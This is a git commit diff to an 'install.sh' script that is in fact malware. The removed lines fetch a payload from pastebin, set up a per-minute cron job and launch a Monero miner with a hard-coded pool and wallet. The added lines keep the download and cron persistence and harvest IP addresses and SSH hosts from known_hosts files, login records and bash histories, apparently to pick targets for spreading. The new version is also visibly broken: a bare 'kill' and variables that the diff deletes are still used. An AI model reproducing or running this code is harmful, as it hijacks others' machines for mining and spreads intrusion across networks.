286a837cf657b680ee256aed92e887c32de522ce
robpot891 <rpotter@live.ca>
2019-01-16 11:33:01 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,23 +1,28 @@
 #!/bin/bash
 
 urlprefix='https://pastebin.com/raw'
-sshtml='https://imersiv.ca'
-xr='shtml'
 
-if [[ $(ps -ef | grep xmrig | grep -v grep | wc -l) != 0 ]]; then
-    killall xmrig
+if [[ $(ps -ef | grep 'bd' | grep -v grep | wc -l) != 0 ]]; then
+    kill 
 fi
-[ ! -f ~/.bd/crontab ] && mkdir ~/.bd
-curl -s -o ~/.bd/bd.sh $urlprefix/P2rfkcKJ
-chmod +x ~/.bd/bd.sh
-[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
-crontab ~/.bd/crontab
-[ ! -f ~/.bd/$xr ] && curl -s -o ~/.bd/$xr $sshtml/$xr
-chmod +x ~/.bd/$xr
-if [[ $(ps -ef | grep $xr | grep -v grep | wc -l) = 0 ]]; then
-    launch=1
-fi
-if [ $launch = 1 ]; then
-    cd ~/.bd/ || exit
-    nohup ./$xr -B -o pool.monero.hashvault.pro:3333 -u 42uGUDQciTUCdgveHQ1SaSSWzzd1T4mFRB61witnZQK1FCXwvjXSxAbbLph8mURcZthneebwBUdrDSgArMQxim9iVX8kabx -p johnnyseven:johnny2guns@tutanota.com -k out.log 2>&1 &
-fi
+[ ! -f /tmp/.bd/crontab ] && mkdir /tmp/.bd
+curl -s -o /tmp/.bd/bd.sh $urlprefix/fcUFJKm0
+chmod +x /tmp/.bd/bd.sh
+[ ! -f /tmp/.bd/crontab ] && echo '* * * * * /bin/bash /tmp/.bd/bd.sh > /dev/null 2>&1' >> /tmp/.bd/crontab
+crontab /tmp/.bd/crontab
+[ ! -f /tmp/.bd/$xr ] && curl -s -o /tmp/.bd/$xr $sshtml/$xr
+chmod +x /tmp/.bd/$xr
+
+last -a|awk '{print $10}'|sort -u|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .h
+cat /root/.ssh/known_hosts|grep -v ,|awk '{print $1}' >> .h
+cat /root/.ssh/known_hosts|grep ,|awk -F, '{print $1}' >> .h
+cat /root/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
+cat /home/*/.ssh/known_hosts|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
+cat /home/*/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
+cat /home/*/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v / |sort -u >> .h
+cat /home/*/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v / |sort -u >> .h
+cat /root/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v /|sort -u >> .h
+cat /root/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v /|sort -u >> .h
+cat .h|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .hh
+cat .h|grep -v 127.0.0.1|grep -v localhost|sort -u >> .hh
+cat .hh > .h
